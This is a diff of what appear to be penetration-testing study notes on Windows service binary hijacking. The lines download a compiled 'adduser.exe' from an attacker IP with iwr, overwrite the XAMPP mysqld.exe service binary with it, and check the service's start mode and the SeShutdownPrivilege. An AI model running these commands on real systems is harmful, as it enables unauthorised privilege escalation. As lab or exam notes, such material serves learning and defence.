@@ -80,10 +80,14 @@ int main ()
   
   return 0;
 }
+
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
 move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for the victim to manually start the service)
 ```
 
 ### Linux
